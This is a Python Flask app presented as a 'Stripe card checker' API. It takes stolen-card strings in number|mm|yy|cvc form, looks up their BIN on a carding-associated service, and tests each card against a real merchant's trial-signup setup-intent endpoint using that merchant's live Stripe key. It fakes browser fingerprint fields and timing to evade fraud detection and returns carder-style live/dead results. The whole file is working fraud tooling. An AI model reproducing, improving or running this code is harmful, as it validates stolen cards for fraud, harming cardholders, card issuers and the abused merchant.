# app.py
# Stripe card checker — URL-based API
# Usage: GET /check?cc=4833130058487877|08|2027|442

import os
import re
import time
import json
import random
import asyncio
import requests
import aiohttp
from flask import Flask, request, jsonify

app = Flask(__name__)

# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────
STRIPE_PK = os.environ.get(
    "STRIPE_PK",
    "pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq"
)
STRIPE_VERSION = os.environ.get("STRIPE_VERSION", "2025-03-31.basil")
SIGNUP_URL = "https://ezycourse.com/signup"
SETUP_INTENT_URL = "https://ezycourse.com/api/ezycourse/onboarding/create-setup-intent"
HCAPTCHA_TOKEN = os.environ.get("HCAPTCHA_TOKEN", "")

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/150.0.0.0 Safari/537.36"
)


# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────
def rand_hex(n: int) -> str:
    return "".join(random.choices("0123456789abcdef", k=n))


def rand_uuid_like() -> str:
    return "".join(random.choices("0123456789abcdef-", k=36))


def parse_cc(raw: str):
    if not raw:
        return None
    parts = [p.strip() for p in raw.split("|")]
    if len(parts) != 4:
        return None
    number, mm, yy, cvc = parts
    number = re.sub(r"\D", "", number)
    mm = re.sub(r"\D", "", mm).zfill(2)
    yy = re.sub(r"\D", "", yy)
    cvc = re.sub(r"\D", "", cvc)
    if not (12 <= len(number) <= 19):
        return None
    if len(mm) != 2 or len(yy) not in (2, 4) or len(cvc) not in (3, 4):
        return None
    if len(yy) == 4:
        yy = yy[2:]
    return number, mm, yy, cvc


def luhn_ok(number: str) -> bool:
    digits = [int(d) for d in number][::-1]
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


# ─────────────────────────────────────────────
# ASYNC BIN LOOKUP — antipublic
# ─────────────────────────────────────────────
async def get_bin_info(card_number: str):
    """
    Returns (brand, bin_type, level, bank, country, flag).
    All '-' on failure.
    """
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(
                f"https://bins.antipublic.cc/bins/{bin_number}"
            ) as res:
                if res.status != 200:
                    return "BIN Info Not Found", "-", "-", "-", "-", ""
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get("brand", "-")
                    bin_type = data.get("type", "-")
                    level = data.get("level", "-")
                    bank = data.get("bank", "-")
                    country = data.get("country_name", "-")
                    flag = data.get("country_flag", "")
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return "-", "-", "-", "-", "-", ""
    except Exception:
        return "-", "-", "-", "-", "-", ""


def run_bin_lookup(card_number: str):
    """Sync bridge for Flask route."""
    try:
        return asyncio.run(get_bin_info(card_number))
    except RuntimeError:
        # If already inside an event loop (rare with Flask sync route)
        loop = asyncio.new_event_loop()
        try:
            return loop.run_until_complete(get_bin_info(card_number))
        finally:
            loop.close()


# ─────────────────────────────────────────────
# STRIPE FLOW
# ─────────────────────────────────────────────
def fresh_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "user-agent": UA,
        "accept-language": "en-US,en;q=0.9",
    })
    try:
        s.get(SIGNUP_URL, timeout=20)
    except Exception:
        pass
    return s


def get_xsrf(session: requests.Session) -> str:
    from urllib.parse import unquote
    tok = session.cookies.get("XSRF-TOKEN")
    return unquote(tok) if tok else ""


def create_payment_method(number, mm, yy, cvc):
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": UA,
    }
    data = {
        "type": "card",
        "card[number]": number,
        "card[cvc]": cvc,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": rand_hex(32),
        "muid": rand_hex(32),
        "sid": rand_hex(32),
        "payment_user_agent": "stripe.js/142f43c30d; stripe-js-v3/142f43c30d; card-element",
        "referrer": "https://ezycourse.com",
        "time_on_page": str(random.randint(30000, 180000)),
        "client_attribution_metadata[client_session_id]": rand_uuid_like(),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "client_attribution_metadata[wallet_config_id]": rand_uuid_like(),
        "key": STRIPE_PK,
        "_stripe_version": STRIPE_VERSION,
    }
    if HCAPTCHA_TOKEN:
        data["radar_options[hcaptcha_token]"] = HCAPTCHA_TOKEN

    try:
        r = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers, data=data, timeout=60,
        )
        return r.status_code, r.json()
    except Exception as e:
        return 0, {"error": {"message": f"network: {e}"}}


def create_setup_intent(session, pm_id):
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://ezycourse.com",
        "referer": SIGNUP_URL + "?plan=pro&interval=month&trial=true",
        "user-agent": UA,
        "x-xsrf-token": get_xsrf(session),
    }
    payload = {"stripe_payment_method_uuid": pm_id, "is_trial": True}
    try:
        r = session.post(
            SETUP_INTENT_URL, headers=headers, json=payload, timeout=60,
        )
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, {"raw": r.text[:1000]}
    except Exception as e:
        return 0, {"error": {"message": f"network: {e}"}}


def classify(pm_status, pm_data, si_status, si_data):
    if pm_status != 200:
        err = (pm_data or {}).get("error", {}) or {}
        msg = err.get("message", "Unknown error")
        code = err.get("code", "error")
        return False, msg, code

    if si_status == 200:
        msg = (
            si_data.get("message")
            or si_data.get("status")
            or si_data.get("data", {}).get("status")
            or "Approved"
        )
        if isinstance(msg, str):
            ml = msg.lower()
            if "declin" in ml or "fail" in ml or "error" in ml:
                return False, msg, si_data.get("code", "si_declined")
            return True, msg, si_data.get("code", "si_approved")
        return True, str(msg), "si_ok"

    err = (si_data or {}).get("error", {}) or {}
    msg = err.get("message") or si_data.get("message") or "Setup intent failed"
    code = err.get("code") or si_data.get("code") or "si_error"
    return False, msg, code


# ─────────────────────────────────────────────
# BIN → display fields (antipublic shape)
# ─────────────────────────────────────────────
def build_bin_fields(brand, bin_type, level, bank, country, flag):
    """
    Mirror your example schema:
      Brand:   VISA
      Issuer:  JPMORGAN CHASE BANK N.A. - DEBIT
      Country: 🇺🇸 UNITED STATES
    """
    brand_out = (brand or "UNKNOWN").upper()
    bank_out = (bank or "UNKNOWN").upper()
    type_out = (bin_type or "").upper()

    issuer = bank_out
    if type_out and type_out not in ("-", ""):
        issuer = f"{bank_out} - {type_out}"

    country_out = f"{flag} {country.upper()}".strip() if country and country != "-" else "UNKNOWN"

    return {
        "Brand": brand_out,
        "Issuer": issuer,
        "Country": country_out,
        # extras — drop these if you want the response tighter
        "Level": level if level and level != "-" else None,
    }


# ─────────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────────
@app.route("/", methods=["GET"])
def index():
    return jsonify({
        "name": "checker",
        "usage": "/check?cc=number|mm|yy|cvv",
        "gateway": "Stripe",
    })


@app.route("/check", methods=["GET"])
def check():
    start = time.time()
    raw = request.args.get("cc", "")
    parsed = parse_cc(raw)

    if not parsed:
        return jsonify({
            "cc": raw,
            "Gateway": "UNKNOWN",
            "Response": "Invalid input format",
            "Price": 0.0,
            "Currency": "USD",
            "Brand": "UNKNOWN",
            "Issuer": "UNKNOWN",
            "Country": "UNKNOWN",
            "Status": False,
            "Proxy": "Not Used",
            "Time": f"{time.time() - start:.2f}s",
        }), 400

    number, mm, yy, cvc = parsed
    cc_display = f"{number}|{mm}|{yy}|{cvc}"

    # ── BIN lookup (async) ─────────────────
    brand, bin_type, level, bank, country, flag = run_bin_lookup(number)
    bin_fields = build_bin_fields(brand, bin_type, level, bank, country, flag)

    # ── Stripe flow ────────────────────────
    session = fresh_session()
    pm_status, pm_data = create_payment_method(number, mm, yy, cvc)
    pm_id = pm_data.get("id") if isinstance(pm_data, dict) else None

    si_status, si_data = (0, {})
    if pm_status == 200 and pm_id:
        si_status, si_data = create_setup_intent(session, pm_id)

    ok, msg, code = classify(pm_status, pm_data, si_status, si_data)

    elapsed = f"{time.time() - start:.2f}s"

    return jsonify({
        "cc": cc_display,
        "Gateway": "Stripe",
        "Response": msg,
        "Price": 0.0,
        "Currency": "USD",
        "Brand": bin_fields["Brand"],
        "Issuer": bin_fields["Issuer"],
        "Country": bin_fields["Country"],
        "Status": ok,
        "Proxy": "Not Used",
        "Time": elapsed,
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
